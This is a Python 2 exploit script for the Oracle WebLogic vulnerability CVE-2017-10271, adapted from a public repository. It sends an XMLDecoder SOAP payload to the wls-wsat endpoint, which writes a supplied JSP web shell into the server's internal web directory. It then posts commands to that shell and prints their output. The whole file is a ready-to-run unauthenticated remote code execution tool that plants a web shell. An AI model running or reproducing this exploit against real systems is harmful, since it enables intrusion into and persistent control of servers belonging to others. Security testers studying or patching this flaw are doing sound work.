#!/usr/bin/env python
#coding:utf-8
import requests
import argparse
import time
import base64
'''
forked from https://github.com/s3xy/CVE-2017-10271
Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). 
Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. 
Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server
Modified by hanc00l
'''
proxies = None#{'http':'http://127.0.0.1:8080'}
headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
timeout = 5
'''
payload的格式化
'''
def payload_command(shell_file,output_file):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    with open(shell_file) as f:
        shell_context = f.read()
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in shell_context)+"</string>"
    payload_1 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java>
    <java version="1.8.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}</string>
    <void method="println">{}</void><void method="close"/>
    </object>
    </java>
    </java>
    </work:WorkContext>
    </soapenv:Header><soapenv:Body/></soapenv:Envelope>'''.format(output_file,command_filtered)
    return payload_1

'''
命令执行
'''
def execute_cmd(target,output_file,command):
    #url增加时间戳避免数据是上一次的结果缓存
    output_url = 'http://{}/bea_wls_internal/{}?{}'.format(target,output_file,int(time.time()))
    data = {'c':command}
    try:
        r = requests.post(output_url,data=data,headers = headers,proxies=proxies,timeout=timeout)
        if r.status_code == requests.codes.ok:
            return (True,r.text.strip())
        elif r.status_code == 404:
            return (False,'404 no output')
        else:
            return (False,r.status_code)
    except requests.exceptions.ReadTimeout:
        return (False,'timeout')
    except Exception,ex:
        #raise
        return (False,str(ex))

'''
RCE：上传命令执行的shell文件
'''
def weblogic_rce(target,cmd,output_file,shell_file):
    url = 'http://{}/wls-wsat/CoordinatorPortType'.format(target)
    #content-type必须为text/xml
    payload_header = {'content-type': 'text/xml','User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
    msg = ''
    try:
        r = requests.post(url, payload_command(shell_file,output_file),headers = payload_header,verify=False,timeout=timeout,proxies=proxies)
        #500时说明已成功反序列化执行命令
        if r.status_code == 500:
            return execute_cmd(target,output_file,cmd)
        elif r.status_code == 404:
            return (False,'404 no vulnerability')
        else:
            return (False,'{} something went wrong'.format(r.status_code))
    except requests.exceptions.ReadTimeout:
        return (False,'timeout')
    except Exception,ex:
        #raise
        return (False,str(ex))

'''
main
'''
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument('-t', '--target',required=True, help='weblogic ip and port(eg -> 172.16.80.131:7001)')
    parse.add_argument('-c', '--cmd', required=False,default='whoami', help='command to execute,default is "whoami"')
    parse.add_argument('-o', '--output', required=False,default='output.jsp', help='output file name,default is output.jsp')
    parse.add_argument('-s', '--shell', required = False,default='exec.jsp',help='local jsp file name to upload')
    args = parse.parse_args()
    
    status,result = weblogic_rce(args.target,args.cmd,args.output,args.shell)
    #output result:
    if status:
        print result
    else:
        print '[-]FAIL:{}'.format(result)

if __name__ == '__main__':
    main()
